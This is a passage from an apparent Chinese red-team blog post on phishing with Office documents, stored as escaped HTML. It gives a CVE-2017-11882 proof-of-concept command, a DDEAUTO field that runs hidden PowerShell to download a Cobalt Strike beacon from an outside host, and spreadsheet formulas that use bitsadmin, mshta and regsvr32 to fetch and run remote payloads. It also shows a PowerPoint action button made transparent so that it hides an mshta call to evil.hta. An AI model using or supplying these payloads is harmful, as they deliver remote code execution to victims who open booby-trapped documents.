title=\"CVE-2017-11882\"></a>CVE-2017-11882</h2><p>此漏洞是由Office软件里面的公式编辑器造成的，即EQNEDT32.EXE程序，这个程序运行的过程中，读入包含MathType的ole数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个非常经典的栈溢出漏洞，攻击者通过构造特殊的字符，可以实现任意代码执行。</p>\n<p>范围：Office 2003到2016的所有版本</p>\n<ul>\n<li>MicrosoftOffice 2000</li>\n<li>MicrosoftOffice 2003</li>\n<li>MicrosoftOffice 2007 Service Pack 3</li>\n<li>MicrosoftOffice 2010 Service Pack 2</li>\n<li>MicrosoftOffice 2013 Service Pack 1</li>\n<li>MicrosoftOffice 2016</li>\n</ul>\n<p>github-poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;CVE-2017-11882</span><br><span class=\"line\">python Command109b_CVE-2017-11882.py -c&quot;cmd.exe &#x2F;c calc.exe&quot;-otest.doc</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"word插入外部对象-OLE\"><a href=\"#word插入外部对象-OLE\" class=\"headerlink\" title=\"word插入外部对象(OLE)\"></a>word插入外部对象(OLE)</h2><p>插入对象，可以准备个word的ico，替换图标</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603131913622.png\" alt=\"image-20220603131913622\"></p>\n<p>双击运行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603132328164.png\" alt=\"image-20220603132328164\"></p>\n<h2 id=\"DDE\"><a href=\"#DDE\" class=\"headerlink\" title=\"DDE\"></a>DDE</h2><p><a href=\"https://cloud.tencent.com/developer/article/1816083\">鱼叉钓鱼：利用 Office 文档进行 DDE 攻击 - 云+社区 - 腾讯云 (tencent.com)</a></p>\n<p>动态数据交换(DDE) 是一个自定义字段，用户可插入文档。这些字段允许用户输入简单的说明，包括插入到新文档中的数据及插入位置。攻击者可以创建包含DDE字段的恶意Word文件（而不需要打开另一个Office应用程序）、打开命令提示符和运行恶意代码。</p>\n<p>首先通过 word 文档设置一个域代码：<strong>crlt+f9</strong>，或者选中<strong>插入 - 文件部件 - 域</strong>，选中第一个 <strong>= (Formula)</strong> 然后<strong>右键切换域代码</strong>来编辑代码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603133327289.png\" alt=\"image-20220603133327289\"></p>\n<p>CS 生成远程生成powershell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DDEAUTO&quot;C:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.2.148:8000&#x2F;beacon.ps1&#39;); # &quot;&quot;Microsoft Document Security Add-On&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603143407697.png\" alt=\"image-20220603143407697\"></p>\n<p>需要点击两次是</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603134518207.png\" alt=\"image-20220603134518207\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603135852937.png\" alt=\"image-20220603135852937\"></p>\n<h2 id=\"IYQ\"><a href=\"#IYQ\" class=\"headerlink\" title=\"IYQ\"></a>IYQ</h2><p>可以将IYQ简单的理解成内置在excel中的一种特殊 web浏览器 （不能加载脚本），通过IQY【即web查询】语句，可以直接将各类web上的列表数据轻松引入到当前的excel中，而正是因为这样，从而给了我们利用excel制作钓鱼邮件的机会，假如你要引入的web数据是入侵者事先准备好的一段payload iqy恶意代码，那结果就不言而喻了。</p>\n<p>office 2016：数据-&gt; 来自网站</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603160846572.png\" alt=\"image-20220603160846572\"></p>\n<p>其他方式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">regsv***</span><br><span class=\"line\">&#x3D;cmd|&#39;&#x2F;c regsv*** &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;ip&#x2F;D4zv0M.sct scrobj.dll &#39;!A0</span><br><span class=\"line\">bitsadmin</span><br><span class=\"line\">&#x3D;cmd|&#39;&#x2F;c bitsadmin &#x2F;transfer e822 http:&#x2F;&#x2F;ip&#x2F;iqy %APPDATA%\\e822.exe&amp;%APPDATA%\\e822.exe&amp;del %APPDATA%\\e822.exe &#39;!A0</span><br><span class=\"line\">mshta</span><br><span class=\"line\">&#x3D;cmd|&#39;&#x2F;c mshta http:&#x2F;&#x2F;ip&#x2F;iqy.hta &#39;!A0</span><br></pre></td></tr></table></figure>\n\n<p>上线，利用工具 nishang：<a href=\"https://github.com/samratashok/nishang/releases\">https://github.com/samratashok/nishang/releases</a></p>\n<p>具体利用过程：<a href=\"https://www.cnblogs.com/askta0/p/10893535.html#/c/subject/p/10893535.html\">Excel的IYQ钓鱼 - AskTa0 - 博客园 (cnblogs.com)</a></p>\n<h2 id=\"PPT动作\"><a href=\"#PPT动作\" class=\"headerlink\" title=\"PPT动作\"></a>PPT动作</h2><p>插入最后一个空白动作按钮</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603161747121.png\" alt=\"image-20220603161747121\"></p>\n<p>设置触发动作为运行程序，这里利用hta上线</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">c:\\Windows\\System32\\mshta.exe http:&#x2F;&#x2F;150.158.181.145:8000&#x2F;evil.hta</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603162346990.png\" alt=\"image-20220603162346990\"></p>\n<p>右键设置形状格式，变为透明隐藏格式</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603162916046.png\" alt=\"image-20220603162916046\"></p>\n<p>触发时会弹窗提示，点击启用上线</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603162957632.png\" alt=\"image-20220603162957632\"></p>\n<h1 id=\"邮箱\"><a href=\"#邮箱\" class=\"headerlink\" title=\"邮箱\"></a>邮箱</h1><p><a href=\"https://www.freebuf.com/articles/network/250134.html\">红队测试之邮箱打点 - FreeBuf网络安全行业门户</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://mp.weixin.qq.com/s/YKZ6yWWxOhn2KjTV5lDP7w\">红蓝对抗之邮件钓鱼攻击 (qq.com)</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1917641\">干货 | Office文档钓鱼的实战和免杀技巧 - 云+社区 - 腾讯云 (tencent.com)</a></p>\n","categories":["Red-Team"]}]